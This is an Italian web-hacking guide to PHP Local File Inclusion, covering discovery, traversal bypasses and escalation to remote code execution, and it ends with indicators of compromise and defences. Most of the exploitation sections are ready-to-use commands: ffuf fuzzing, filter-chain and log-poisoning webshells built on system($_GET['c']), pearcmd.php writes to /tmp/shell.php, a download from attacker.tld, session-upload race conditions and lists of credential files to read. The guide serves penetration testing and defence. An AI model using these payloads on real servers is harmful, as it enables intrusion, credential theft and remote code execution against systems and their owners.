---
title: 'Local File Inclusion (LFI): Attacchi, Payload, RCE & Bypass'
slug: lfi
description: 'Scopri come funziona la vulnerabilità LFI: lettura dei file, PHP wrapper, filter chain e log poisoning, con tecniche di exploitation e contromisure nel pentest.'
image: /local-file-inclusion-lfi-php-rce.webp
draft: false
date: 2026-03-15T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - Local File Inclusion
  - LFI Vulnerability
  - PHP Wrappers
  - PHP Filter Chain
  - Remote Code Execution
---

# LFI (Local File Inclusion) in PHP: dalla lettura di file alla RCE

La **LFI (Local File Inclusion)** è una vulnerabilità in cui un'applicazione passa un input controllato dall'utente a una funzione che **include** un file (in PHP `include()`, `include_once()`, `require()`, `require_once()`) invece di limitarsi a leggerlo. Una Local File Inclusion permette quasi sempre di leggere file del server; diventa esecuzione di codice (RCE) solo a certe condizioni. Questa guida raccoglie in un posto solo il catalogo più completo di tecniche in giro: payload di traversal, file da leggere, wrapper PHP, filter chain, log e session poisoning, `pearcmd.php`, trucchi con `/proc`, file temporanei e upload, e le difese.

> **Risposta rapida.** Una LFI ti dà **lettura** di codice sorgente, configurazioni e credenziali. Diventa **RCE** solo se il contenuto incluso è, o diventa, codice PHP valido: tramite un wrapper (`php://input`, `data://`, `php://filter` in chain), un file che controlli (log, sessione, upload, file temporaneo) o una tecnica come `pearcmd.php`. Quale strada funziona dipende dalla versione di PHP, dalla configurazione (`allow_url_include`, `register_argc_argv`, estensioni) e da cosa è scrivibile o leggibile dal processo web. Non esiste una tecnica che funzioni sempre.

La differenza con il [Path Traversal](/articoli/path-traversal/): il Path Traversal è la manipolazione del percorso per uscire dalla cartella prevista; la LFI è la classe di vulnerabilità in cui quel percorso finisce in una funzione di inclusione. Si usano spesso insieme (il traversal per raggiungere il file, la LFI per includerlo), ma non sono la stessa cosa.

Questa guida fa parte del satellite della [guida pillar File & Path Attacks](/articoli/file-path-attacks-guida-completa/) e va letta insieme a [RFI](/articoli/rfi/) (la stessa idea, ma il file incluso sta su un host remoto) e [Arbitrary File Read](/articoli/arbitrary-file-read/) (quando l'obiettivo è solo leggere).

## Cos'è una LFI e cosa significa davvero "eseguire" un file

Quando PHP incontra `include($file)`, apre `$file` e **interpreta** il suo contenuto come script PHP: ciò che sta fuori dai tag `<?php ... ?>` viene stampato come testo, ciò che sta dentro viene eseguito. Per questo includere `config.php` normalmente non "mostra" il codice sorgente: PHP lo esegue. Se il file contiene solo variabili (niente `echo`), l'output è vuoto: l'ho verificato, con un file di tre assegnazioni e nessun `echo` la risposta HTTP è di 0 byte.

Da qui nascono due esigenze opposte:

* **Per leggere il sorgente** serve impedire l'esecuzione e ottenere il contenuto grezzo: è il ruolo di `php://filter`.
* **Per ottenere RCE** serve che il contenuto incluso sia codice PHP valido quando PHP lo interpreta: alcuni wrapper lo permettono, altrimenti devi scrivere PHP in un file che poi includi (log, sessione, upload).

## Discovery: trovare il parametro e confermarlo

Un parametro è sospetto quando il suo valore sembra un nome di file, un template o una lingua. I nomi più comuni: `cat`, `dir`, `action`, `board`, `date`, `detail`, `file`, `download`, `path`, `folder`, `prefix`, `include`, `page`, `inc`, `locate`, `show`, `doc`, `site`, `type`, `view`, `content`, `document`, `layout`, `mod`, `conf`.

Il fuzzing con [ffuf](/articoli/ffuf/) è il modo più veloce per testare molti parametri e molti payload insieme:

```bash
# find which parameter is vulnerable, trying several names at once
ffuf -u "https://target.tld/index.php?FUZZ=../../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mr "root:x:"

# once the parameter is known, fuzz payload variants (encoding, depth, wrappers)
ffuf -u "https://target.tld/index.php?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mr "root:x:"
```

Due avvertenze sui falsi positivi, verificate nel lab:

* Un match su `root:x:` conferma che **quel payload specifico** ha funzionato, non che ogni traversal funzioni. Testando `../../../../etc/passwd` contro un parametro con prefisso/suffisso fissi (`include("lang/" . $_GET['l'] . ".php")`) ottengo `Failed to open stream`, perché il file risultante è `lang/../../../../etc/passwd.php`, che non esiste. La stessa stringa funziona su un parametro senza prefisso/suffisso.
* Un file letto con successo **non significa RCE**: sono passaggi distinti, con prerequisiti distinti.

## Payload di traversal e bypass dei filtri

### Base

```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd
?page=/etc/passwd                       # absolute path, when no prefix is prepended
?page=C:\Windows\win.ini                # Windows, absolute path
?page=..\..\..\Windows\win.ini          # Windows, backslashes
```

Quanti `../` servono? Non lo sai in anticipo: poiché `..` sulla radice resta sulla radice, ne puoi mettere di più del necessario (`../../../../../../../../etc/passwd`) senza problemi.

### Encoding

| Tecnica               | Esempio                      | Quando funziona                                                                                            |
| --------------------- | ---------------------------- | ---------------------------------------------------------------------------------------------------------- |
| URL encoding          | `%2e%2e%2f`                  | Filtro che cerca la stringa `../` letterale prima della decodifica                                         |
| Doppio URL encoding   | `%252e%252e%252f`            | Un livello di decodifica avviene prima del controllo e un altro dopo (tipico di proxy/WAF davanti all'app) |
| UTF-8 overlong        | `%c0%ae%c0%ae/`, `..%c0%af`  | Dipende da come il livello che normalizza il percorso gestisce sequenze non canoniche; non generalizzabile |
| Unicode 16 bit        | `%u002e%u002e%u2215`         | Solo stack che interpretano `%uXXXX` (tipicamente IIS datati)                                              |
| Backslash/slash misti | `..\/..\/` , `/%5C../%5C../` | Filtri scritti per un solo separatore                                                                      |

### Bypass di filtri applicativi

```
....//....//....//etc/passwd        # non-recursive ../ strip
....\/....\/etc/passwd
..///////..////..//////etc/passwd   # redundant slashes collapse
/%5C../%5C../%5C../etc/passwd       # encoded backslash
```

`....//` funziona **solo** se il codice rimuove `../` con una singola `str_replace` non ripetuta: l'ho riprodotto, il filtro lascia `../` dopo la rimozione. Su un filtro che ripete la rimozione fino a stabilizzarsi non serve a nulla.

### Prefisso e suffisso fissi

Se l'app aggiunge un prefisso (`include("lang/" . $f)`), serve un `../` in più per uscirne. Se aggiunge un suffisso (`.php`), le strade sono: leggere solo file con quell'estensione (con `php://filter` leggi il sorgente `.php` di altre pagine), usare un wrapper che non dipende dal nome (`data://`, `php://input`, entrambi con `allow_url_include=On`), o uno dei trucchi sotto.

### Tecniche storiche (morte sulle versioni correnti)

| Tecnica                                                                               | Stato verificato                                                                                                                 |
| ------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| Null byte (`%00`) a fine stringa                                                      | **Morta.** Su PHP 8.3 l'ho testata: nessun effetto, il warning mostra il suffisso ancora attaccato. Il fix risale alla 5.3.4/5.4 |
| Path truncation (`/etc/passwd` + centinaia di `/` o `/.` fino al limite di 4096 byte) | **Storica**, legata a PHP \< 5.3                                                                                                 |
| Cartella extra in testa (`....//....//`) con `str_replace` ripetuto                   | Non funziona se il filtro è ricorsivo                                                                                            |

Il punto comune: **nessuno di questi è un bypass della LFI in sé**; sono bypass di un filtro specifico, da verificare uno per uno.

### Altri contesti

* **Python**: `os.path.join('/var/www/uploads', user_input)` scarta tutto ciò che precede se `user_input` è un percorso assoluto (`/etc/passwd`). Non serve alcun `../`.
* **Java**: alcune API restituiscono l'elenco di una directory invece del contenuto di un file se punti a una cartella: utile per esplorare il filesystem prima di scegliere cosa leggere.

## File da leggere dopo la conferma

Una volta confermata la LFI, l'obiettivo è capire dove vive l'applicazione e che segreti contiene. Le categorie, con esempi:

| Categoria              | Linux                                                                             | Windows                                                                                      |
| ---------------------- | --------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| Utenti e sistema       | `/etc/passwd`, `/etc/hosts`, `/etc/os-release`, `/proc/version`                   | `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`                                |
| Web server             | `/etc/apache2/sites-enabled/000-default.conf`, `/etc/nginx/nginx.conf`            | `C:\inetpub\wwwroot\web.config`, `C:\Windows\System32\inetsrv\config\applicationHost.config` |
| Configurazione PHP     | `/etc/php/*/apache2/php.ini`                                                      | `C:\xampp\php\php.ini`                                                                       |
| Segreti applicativi    | `.env`, `wp-config.php`, `config.php` nella webroot                               | `web.config`                                                                                 |
| Processo corrente      | `/proc/self/cmdline`, `/proc/self/cwd/`, `/proc/net/tcp`, `/proc/mounts`          | non applicabile                                                                              |
| Container              | `/.dockerenv`, `/var/run/secrets/kubernetes.io/serviceaccount/token`              | non applicabile                                                                              |
| Chiavi e cronologia    | `~/.ssh/id_rsa`, `~/.bash_history` (solo se leggibili dall'utente del web server) | non applicabile                                                                              |
| Credenziali di sistema | `/etc/shadow` (leggibile solo se PHP gira come root, raro)                        | `C:\Windows\repair\SAM`, `C:\Windows\System32\config\RegBack\SAM`                            |

Nota sull'ultima riga: SAM e SYSTEM vanno letti insieme per estrarre gli hash offline; su sistemi moderni questi file sono quasi sempre inaccessibili al processo web. Le wordlist complete (Linux, Windows, Mac, BSD, file web) si trovano nelle raccolte dedicate a LFI incluse in SecLists (`Fuzzing/LFI`): usale con ffuf come mostrato sopra.

Un dettaglio utile dai log: se riesci a leggere i log di accesso del web server, cerca nelle URL token inviati in GET (link di reset password, ID di sessione): possono essere riusati. È una lettura di dati, non serve alcuna esecuzione.

## PHP wrapper: cosa fa ciascuno e a quali condizioni

I wrapper sono protocolli che PHP riconosce al posto di un percorso. Non richiedono tutti le stesse condizioni, e confonderli è l'errore più comune nelle guide in giro.

| Wrapper             | Cosa fa                                                               | Richiede                                                                    |
| ------------------- | --------------------------------------------------------------------- | --------------------------------------------------------------------------- |
| `php://filter`      | Applica un filtro al contenuto di un file locale prima di restituirlo | Nessuna configurazione speciale, funziona anche con `allow_url_include=Off` |
| `php://input`       | Il corpo della richiesta diventa il contenuto incluso                 | `allow_url_include=On` (default `Off`)                                      |
| `data://`           | Il contenuto è nell'URL stesso                                        | `allow_url_include=On`                                                      |
| `expect://`         | Esegue un comando                                                     | Estensione PECL `expect`, non installata di default                         |
| `zip://`, `phar://` | Leggono un file dentro un archivio                                    | Un modo per far arrivare l'archivio sul server                              |
| `compress.zlib://`  | Legge un file, anche compresso                                        | Nessuna                                                                     |
| `glob://`           | Elenca file che corrispondono a un pattern                            | Utile per enumerare, solo con funzioni che lo supportano                    |

Il nome del wrapper non è case-sensitive per PHP (`PhP://FiLtEr` funziona), ma questo non è un bypass di sicurezza: aiuta solo contro un controllo letterale sulla stringa `php://`.

Una nota su `phar://`: fino a PHP 7.4 il solo accesso a un file Phar poteva deserializzare i suoi metadati; da PHP 8.0 questo non avviene più in automatico. È un motivo in più per non lasciare `phar://` raggiungibile da input utente.

### `php://filter`: leggere il sorgente senza eseguirlo

```
GET /page.php?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
```

Nel mio lab la risposta è il file in base64, che decodificato mostra il sorgente (credenziali di test):

```
PD9waHAKJGRiX2hvc3QgPSAnMTAuMC4xLjUwJzsKJGRiX3VzZXIgPSAnYWRtaW4nOwokZGJfcGFzcyA9ICdTdXBlclNlY3JldDEyMyEnOwo/Pgo=
```

```php
<?php
$db_host = '10.0.1.50';
$db_user = 'admin';
$db_pass = 'SuperSecret123!';
?>
```

Se `base64-encode` è bloccato da un WAF, altri filtri cambiano solo la codifica: `string.rot13`, `convert.iconv.UTF-8.UTF-16`, `zlib.deflate` (poi da decomprimere). Sono alternative legittime, non bypass magici.

Se l'app aggiunge `.php` in coda, `resource=config` legge `config.php`: è il modo normale per dumpare il sorgente di altre pagine.

## Dalla lettura alla RCE: cosa devi sapere (e cosa non trovi qui)

La LFI diventa esecuzione di codice solo se il contenuto incluso diventa codice PHP. Le famiglie di tecniche sono queste:

* **Wrapper che portano input nel flusso di inclusione** (`php://input`, `data://`): richiedono `allow_url_include=On`, disattivato di default da anni.
* **File che l'attaccante riesce a influenzare** e che l'app poi include: log di servizio, file di sessione, file caricati, file temporanei di upload, cartelle di PEAR su immagini Docker PHP. Ognuna ha prerequisiti precisi.
* **La PHP filter chain**, che trasforma byte per byte il contenuto di un file qualsiasi (anche vuoto) in codice PHP, sfruttando solo `php://filter` — senza bisogno di scrivere nulla sul server.

Le vedo una per una, con quello che ho verificato nel lab e quello che resta solo documentato.

## La PHP filter chain: RCE dal solo file read, con condizioni precise

Nel 2023-2024 Synacktiv ha pubblicato una tecnica che concatena decine di filtri `convert.iconv` per trasformare, byte per byte, il contenuto di un file qualsiasi (anche uno vuoto, come `php://temp`) nel codice PHP che l'attaccante vuole eseguire. Il tool di riferimento, `php_filter_chain_generator`, genera la chain da un payload PHP qualunque:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>' > chain.txt
```

Il file generato è una sola riga, lunga diverse migliaia di caratteri (nel mio test, quasi 5.800). Usata al posto del parametro vulnerabile:

```bash
CH=$(cat chain.txt)
curl -s -G "https://target.tld/page.php" --data-urlencode "file=$CH" --data-urlencode "c=id"
# output ottenuto nel lab: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Funziona davvero, l'ho verificato: comando eseguito, nessun upload, nessun log da trovare. Ma non è universale:

* Serve una LFI su una primitiva che accetti uno stream wrapper come percorso, non tutte lo permettono.
* Dipende dalla versione di PHP: dalla 8.6 in poi (RFC "limit-maximum-number-of-filter-chains") ogni `php://filter` è limitato a 16 filtri per default, mentre le chain generate da questo tool ne usano centinaia. Su tutte le versioni precedenti (la grande maggioranza dei server oggi) il limite non esiste.
* La chain è lunghissima e può superare i limiti di lunghezza URL del server o del reverse proxy: se fallisce in GET per lunghezza, prova POST.

### Variante: leggere un file alla cieca con lo stesso principio

Una LFI cieca (nessun contenuto riflesso in risposta) sembra inutile per esfiltrare dati, ma si può trasformare in un oracolo: alcuni filtri falliscono (producono un errore PHP, quindi una risposta HTTP diversa) a seconda del contenuto del file, byte per byte. Interrogando ripetutamente il server con filtri diversi e osservando solo se fallisce o no, si ricostruisce il contenuto senza mai vederlo direttamente. Esistono tool che automatizzano il processo lanciando centinaia di richieste mirate:

```bash
python3 filters_chain_oracle_exploit.py --target https://target.tld/blind.php --file /etc/hostname --parameter file
```

Nel mio lab, contro una pagina che non riflette nulla in risposta (`@include($_POST['file']);` con `display_errors` disattivato), il tool ha ricostruito correttamente il contenuto di un file di test in pochi secondi. Più lento di una LFI normale (molte richieste per ogni byte), ma è l'unica via quando l'output non è mai visibile.

### Una nota su CVE-2024-2961 (glibc `iconv`)

Nel 2024 Charles Fol ha pubblicato CVE-2024-2961, un buffer overflow nella funzione `iconv()` della glibc innescabile tramite la conversione di charset `ISO-2022-CN-EXT`, usata anche dai filtri `convert.iconv` di PHP. Su sistemi con una glibc vulnerabile (PHP 7.0.0–8.3.7, glibc ≤2.39, accesso ai filtri `convert.iconv`/`zlib.inflate`/`dechunk`), questo apre una strada di RCE più diretta rispetto alla filter chain "costruttiva" vista sopra. Non l'ho riprodotta nel lab (richiede una build glibc specifica): dipende dalla versione esatta della libc del sistema operativo sottostante, non solo da PHP, quindi verifica sempre quella prima di assumere che sia sfruttabile.

## Log poisoning: scrivere PHP in un file che poi includi

Quando i wrapper non sono percorribili (nessun `allow_url_include`, PHP 8.6+ con limite sulla chain, nessun modo di caricare un file), l'alternativa classica è scrivere codice PHP in un posto che l'applicazione logga per conto tuo, e poi includere quel file.

```bash
# Step 1: find a log reachable through the same LFI
?file=../../../../var/log/apache2/access.log
?file=../../../../var/log/nginx/access.log

# Step 2: get your payload logged — simplest vector is the User-Agent
curl -s "https://target.tld/" -A '<?php system($_GET["c"]); ?>'

# Step 3: include the log, passing the command in the same request
curl -s "https://target.tld/page.php?file=../../../../var/log/apache2/access.log&c=id"
```

Un dettaglio che ho trovato testando (e che non vedo citato quasi da nessuna parte): se il payload contiene doppi apici, Apache li salva nel log già preceduti da backslash di escape, e PHP incontra un errore di sintassi provando a interpretarli — il log poisoning fallisce silenziosamente. Con apici singoli (`system($_GET['c'])` invece di `system($_GET["c"])`) il problema non si presenta: nel lab, con apici singoli, l'esecuzione è andata a buon fine al primo colpo (`uid=33(www-data)`).

Prerequisiti reali, spesso dati per scontati: il processo PHP deve poter leggere il file di log. Su molte distribuzioni Linux i log di Apache/Nginx sono di proprietà di `root:adm` con permessi `640`: in quel caso l'inclusione fallisce con "Permission denied", a prescindere da quanto sia corretto il resto della tecnica. L'ho riprodotto nel lab impostando quei permessi: stessa richiesta, stesso payload, risultato "Permission denied" invece di RCE. Verificalo prima di dare per morta o per funzionante la tecnica.

Altri log utilizzabili: i log di **vsftpd** (`/var/log/vsftpd.log`, scrivendo il payload nel campo username al login FTP anonimo), i log **SSH** (`/var/log/auth.log` o `/var/log/secure`, scrivendo il payload come username di un tentativo di connessione SSH fallito: `ssh '<?php system($_GET["c"]); ?>'@target.tld`), e i log di **mail/SMTP** (inviando un'email il cui header (es. `To` o un campo custom) contiene il payload, poi includendo il mail log). Il principio è identico in tutti i casi: trova un log che la tua LFI può raggiungere, scrivici dentro PHP tramite un campo che l'applicazione non sanifica, poi includilo.

## Session poisoning: la via affidabile è una race condition

La versione "scolastica" del session poisoning (trovare una pagina che salva un input utente in `$_SESSION` e sperare che sia PHP valido) è poco realistica: richiede un comportamento applicativo specifico che raramente esiste così com'è. La tecnica che funziona davvero sfrutta una funzionalità di PHP stesso: **`PHP_SESSION_UPLOAD_PROGRESS`**.

Quando `session.upload_progress.enabled` è attivo (default dalla 5.4 in poi) e una richiesta multipart contiene un campo chiamato `PHP_SESSION_UPLOAD_PROGRESS`, PHP scrive quel valore, non filtrato, nel file di sessione dell'utente, per tutta la durata dell'upload, e lo ripulisce subito dopo che l'upload finisce. Se in quella finestra (anche solo una frazione di secondo, se il file caricato è grande) un'altra richiesta include il file di sessione, PHP esegue quello che hai messo in `PHP_SESSION_UPLOAD_PROGRESS`.

Prerequisiti: una LFI che possa includere `session.save_path` (di default `/var/lib/php/sessions/sess_<ID>` su Debian/Ubuntu), e la possibilità di impostare tu stesso l'ID di sessione (`Cookie: PHPSESSID=qualcosa`), non serve rubarlo. È una corsa: servono più richieste di upload e più richieste di inclusione in parallelo per aumentare le probabilità di centrare la finestra.

Nel mio lab, con 4 thread che caricano un file da qualche megabyte e 8 thread che includono in loop il file di sessione in parallelo, la race è stata vinta in 0,2 secondi. Non è una tecnica di laboratorio teorica: è affidabile quanto basta per essere la prima scelta quando log poisoning non è percorribile.

Un dettaglio utile: PHP antepone sempre il prefisso `upload_progress_` al nome della sessione che salva, quindi il file conterrà `upload_progress_<tuo payload>`, non il payload da solo. Nella maggior parte dei casi questo non impedisce l'esecuzione (il prefisso, prima di `<?php`, viene semplicemente stampato come testo), ma se serve rimuoverlo per far combaciare un pattern più stretto, un trucco è codificare tre volte il payload in base64 e farlo decodificare da un filtro `convert.base64-decode` nella stessa chain `php://filter`: il prefisso `upload_progress_` non è base64 valido e viene scartato nella decodifica, lasciando solo il payload.

## `pearcmd.php`: RCE specifica delle immagini Docker ufficiali di PHP

Una tecnica meno nota, diffusa dal ricercatore cinese phith0n, sfrutta il fatto che molte immagini Docker ufficiali `php:*-apache` e `php:*-fpm` includono PEAR per default, e con esso `/usr/share/php/pearcmd.php`: uno script pensato per essere lanciato da riga di comando, ma che PHP eseguirà comunque se lo includi via HTTP, interpretando la query string come se fossero argomenti CLI. Il prerequisito comune a ogni variante è **`register_argc_argv=On`**: con il default di `php.ini-production` (`Off`), `pearcmd.php` fallisce con `Undefined array key "argv"` e non fa nulla. Verificalo prima di investire tempo: se l'errore compare, il percorso è chiuso.

**Metodo 1 — config-create**, il più diffuso:

```bash
curl -s -g "https://target.tld/page.php?+config-create+/&file=/usr/share/php/pearcmd.php&/<?=system(\$_GET['c'])?>+/tmp/shell.php"
curl -s "https://target.tld/page.php?file=/tmp/shell.php&c=id"
```

**Metodo 2 — man\_dir**, che scrive invece in una cartella documentazione configurabile:

```bash
curl -s -g "https://target.tld/page.php?file=/usr/share/php/pearcmd.php&+-c+/tmp/conf.ini+-d+man_dir=/tmp/shell.php+config-show"
```

**Metodo 3 — download**, che scarica un payload remoto (richiede che il server possa raggiungere l'URL):

```bash
curl -s -g "https://target.tld/page.php?file=/usr/share/php/pearcmd.php&+download+http://attacker.tld/shell.php"
```

**Metodo 4 — install**, che installa un pacchetto PEAR malevolo preparato ad hoc.

**Variante avanzata (Orange Tsai)**: su setup Nginx+PHP-FPM, una "confusion attack" basata su CRLF iniettato nella richiesta può raggiungere `pearcmd.php` anche quando il parametro `file` non è normalmente controllabile dall'attaccante, sfruttando come FPM interpreta i path. È una tecnica più delicata, specifica della configurazione del reverse proxy, e va verificata caso per caso.

Ho verificato nel lab solo il Metodo 1, con la distinzione `register_argc_argv` On/Off descritta sopra; i Metodi 2-4 e la variante Orange Tsai non sono stati testati qui.

## Tecniche con `/proc` e file temporanei

### `/proc/self/environ`: tecnica storica, oggi spesso bloccata

La variante classica scrive PHP nello User-Agent e include `/proc/self/environ` (le variabili d'ambiente del processo, incluso `HTTP_USER_AGENT`). L'ho testata nel mio lab (Apache con mod\_php su un container moderno) e il risultato è "Permission denied", non per un problema di permessi sul file in sé, ma per le restrizioni che i kernel Linux moderni e molte configurazioni container applicano all'accesso a `/proc/<pid>/environ` anche per lo stesso utente proprietario del processo. Funziona ancora su alcune configurazioni CGI o mod\_php datate, ma non è più un vettore di default.

### `/proc/*/fd/$FD`: brute force dei file descriptor

Se riesci a caricare molti file (anche se vengono subito cancellati dal server dopo l'elaborazione), ciascun upload resta aperto per un breve periodo come file descriptor del processo PHP, raggiungibile come `/proc/self/fd/<N>` o `/proc/<pid>/fd/<N>`. Caricando molte shell in parallelo e tentando in loop l'inclusione di `/proc/self/fd/0` fino a `/proc/self/fd/50` circa, si aumenta la probabilità di colpire un descrittore ancora valido prima che l'upload venga ripulito. È una tecnica di forza bruta, non deterministica, e il range di FD da provare varia da sistema a sistema.

### phpinfo() race condition

Se è raggiungibile una pagina `phpinfo()`, questa espone temporaneamente il percorso del file temporaneo di un upload in corso (`$_FILES['...']['tmp_name']`), prima che PHP lo elimini a fine richiesta. Caricando ripetutamente un file e interrogando in loop `phpinfo()` (con uno script che automatizza upload e polling) si può leggere quel percorso e includerlo nella stessa finestra temporale. Come la race su `PHP_SESSION_UPLOAD_PROGRESS`, è questione di vincere una corsa, non di certezza.

### Nginx temp file e `/proc/<pid>/fd`

Quando Nginx è configurato con `client_body_in_file_only` o simili, il body di una richiesta POST (compreso un payload PHP) viene scritto temporaneamente su disco prima di essere passato al backend. Se nella stessa finestra un processo PHP ha quel file aperto come file descriptor, `/proc/<pid>/fd/<N>` punta a un contenuto che non esiste più su disco come file nominato, ma resta leggibile tramite il descrittore. Una variante recente di questa classe di problemi è CVE-2025-1974 ("IngressNightmare"), relativa a Ingress-NGINX su Kubernetes: specifica di quel contesto, non di Nginx in generale.

### Tecniche DoS-oriented (da conoscere, non da usare come prime scelte)

* **Eternal waiting**: includere `/sys/kernel/security/apparmor/revision` può far rimanere PHP in attesa indefinitamente su alcuni sistemi con AppArmor; mentre la richiesta è "congelata", si tenta in loop l'inclusione di file temporanei di upload per provare a leggerli prima che vengano ripuliti. È esplicitamente una tecnica che consuma risorse del server (ogni richiesta resta appesa), quindi va valutata con cautela anche in un contesto autorizzato.
* **Segmentation fault**: alcuni payload specifici di versione (storicamente PHP 7.0/7.2) potevano far crashare il processo PHP durante il parsing di un file incluso, lasciando temporaneamente accessibile un file temporaneo. **Non è una tecnica affidabile sulle versioni correnti di PHP** ed è citata qui solo per completezza storica.

## Altre vie verso RCE

* **`pearcmd.php`** e le altre tecniche sopra restano la via più diretta su immagini Docker ufficiali.
* **LFI via `assert()`**: se il codice applicativo usa `assert($traversal_check)` con una stringa costruita da input utente invece di una vera funzione booleana, PHP (fino alla 7, dove `assert()` con stringa esegue codice) può interpretare quella stringa come codice PHP. Pattern raro, legato a un errore architetturale specifico, non a una proprietà generale della LFI.
* **Bypass dell'estensione via base64**: il filtro `convert.base64-decode` di `php://filter` ignora i caratteri che non fanno parte dell'alfabeto base64. Questo permette, in alcuni contesti che impongono un'estensione finale, di accodare del testo non-base64 (incluso un falso suffisso `.php`) dopo il blob codificato, perché quel testo viene scartato silenziosamente durante la decodifica e non interferisce con l'esecuzione del payload decodificato.
* **HTML-to-PDF e path traversal nei motori SVG/IMG**: alcune librerie che generano PDF da HTML (motori basati su TCPDF) hanno storicamente permesso path traversal tramite tag `<img>` o elementi SVG con percorsi controllati dall'utente, risolto in TCPDF 6.9.1. Se il target genera PDF da contenuto HTML fornito dall'utente, vale la pena controllare la versione della libreria.
* **FindFirstFile su Windows**: le API Windows di enumerazione file supportano wildcard come `<<` e `>` oltre al classico `*`, utile per bypassare filtri che bloccano solo l'asterisco classico quando il target enumera file invece di includerli direttamente.

## Bypass di filtri: cosa è ancora vivo, cosa è morto (riepilogo)

| Tecnica                               | Stato verificato                                                                   |
| ------------------------------------- | ---------------------------------------------------------------------------------- |
| Null byte (`%00`) a fine stringa      | Morta dalla 5.3.4 (PHP tronca la stringa internamente); su PHP 8.3 nessun effetto  |
| Path truncation                       | Storica, PHP \< 5.3                                                                |
| Doppio URL encoding                   | Utile solo se un livello di decodifica avviene prima del controllo e un altro dopo |
| UTF-8 overlong                        | Dipende dallo stack davanti a PHP, non generalizzabile                             |
| Strip non ricorsivo di `../`          | Funziona solo se il filtro applicativo non ripete la rimozione                     |
| JSON body invece di query string/form | Evasione utile solo se il WAF non ispeziona anche il body JSON                     |

Nessuno di questi è un bypass della LFI in sé: sono bypass di un filtro applicativo specifico, da verificare uno per uno contro l'implementazione reale.

## Dalla LFI alla shell: la sequenza con cui lavoro davvero

Non playbook separati, una sola progressione, con la decisione a ogni bivio:

1. **Conferma la LFI** con ffuf su parametro e payload, poi verifica a mano che il risultato non sia un falso positivo legato a prefisso/suffisso.
2. **Leggi il sorgente** con `php://filter/convert.base64-encode`. Cerca credenziali (`.env`, file di configurazione, `wp-config.php` e simili) prima di tentare qualunque RCE: spesso bastano queste per accedere diversamente al sistema.
3. **Prova l'RCE diretta**, in ordine di probabilità di successo: `php://input` o `data://` (richiedono `allow_url_include=On`) → PHP filter chain (richiede PHP \< 8.6, o 8.6+ senza il limite rafforzato) → `pearcmd.php` se è un'immagine Docker ufficiale PHP (richiede `register_argc_argv=On`) → zip/phar se riesci a caricare un file.
4. **Se nessun wrapper funziona**, log poisoning (verifica i permessi del file di log prima di escludere la tecnica) o, meglio ancora, la race condition su `PHP_SESSION_UPLOAD_PROGRESS`.
5. **Se la LFI è cieca**, valuta l'oracolo error-based per l'esfiltrazione, o le tecniche basate su race (phpinfo, FD brute force), prima di scartare la vulnerabilità come "non sfruttabile".
6. **Da shell, cerca segreti** (`.env`, chiavi SSH, variabili d'ambiente) e valuta l'escalation verso database, servizi cloud o altri sistemi, ma questo passaggio dipende interamente da cosa trovi.

## Scenario illustrativo (laboratorio, non un caso reale)

Per mostrare la sequenza intera, ecco uno scenario costruito nel mio ambiente di test, non un incarico reale, e lo segnalo esplicitamente perché un report che confonde i due piani perde credibilità.

Applicazione PHP con `?lang=en` che include `languages/en.php`. Fuzzing con ffuf conferma il parametro. `php://filter/convert.base64-encode/resource=../config` restituisce un file con credenziali MySQL di test. Il parametro accetta anche `php://input`: con `allow_url_include=On` (impostazione volutamente lasciata nel lab per mostrare la tecnica) ottengo esecuzione di comandi con `system($_GET['c'])` nel body della richiesta POST, confermata da `uid=33(www-data)`.

Da qui in poi non proseguo con passaggi non dimostrati: forgiare un cookie di sessione admin richiede conoscere il framework, il formato del cookie e l'algoritmo di firma usati, non è un passaggio automatico dalla sola scoperta di una `SECRET_KEY`, e lo stesso vale per qualunque salto verso Active Directory o Domain Admin, che richiede credenziali, privilegi e condizioni specifiche del tutto indipendenti dalla LFI di partenza. Un report onesto si ferma al punto in cui l'evidenza finisce.

## Indicatori di compromissione

* Parametri URL o body contenenti `php://`, `data://`, `zip://`, `phar://`, `expect://`, o lunghe sequenze di `convert.iconv`: queste ultime, in particolare, sono una firma quasi univoca della filter chain, perché nessun uso legittimo genera stringhe di migliaia di caratteri in quel formato
* Richieste multipart con un campo `PHP_SESSION_UPLOAD_PROGRESS` seguito, a brevissima distanza, da richieste verso lo stesso endpoint con un parametro che assomiglia a un percorso di sessione
* User-Agent, username SSH/FTP o header mail contenenti `<?php`, `system(`, `exec(`, `passthru(` nei log
* Richieste verso file di log (`access.log`, `error.log`, `auth.log`, `vsftpd.log`) passati come valore di un parametro
* Richieste verso `pearcmd.php` con parametri `+config-create`, `+download` o simili nella query string
* Processi di shell (`sh`, `bash`) generati come figli del processo PHP/Apache subito dopo una richiesta con uno di questi pattern

## Difesa: cosa risolve davvero il problema

```php
// vulnerable: user input decides which file gets included
include($_GET['page']);
include($_GET['page'] . '.php');
include("templates/" . $_GET['lang'] . ".php");

// not vulnerable: user input only selects an index into a fixed, server-side list
$allowed = ['en' => 'lang/en.php', 'it' => 'lang/it.php', 'de' => 'lang/de.php'];
$lang = $_GET['lang'] ?? 'en';
include($allowed[$lang] ?? $allowed['en']);
```

L'unica difesa che chiude il problema alla radice è la whitelist: l'input dell'utente seleziona una chiave in un array definito lato server, mai un percorso. Tutto il resto è difesa in profondità, utile ma non sufficiente da sola:

* `allow_url_include = Off` (il default da anni) chiude `php://input` e `data://`, ma non tocca `php://filter`, `zip://` o `phar://`;
* `open_basedir` limita quali directory PHP può aprire, riducendo (non eliminando) il traversal utile;
* permessi restrittivi sui file di log (non leggibili dall'utente con cui gira PHP) chiudono il log poisoning;
* `session.upload_progress.enabled = Off` chiude la tecnica basata sulla race condition, se non serve a nient'altro nell'applicazione;
* `register_argc_argv = Off` (il default di produzione) chiude `pearcmd.php`;
* aggiornare a PHP ≥ 8.6 (quando sarà stabile) riduce l'affidabilità della filter chain "classica", ma non elimina le altre strade.

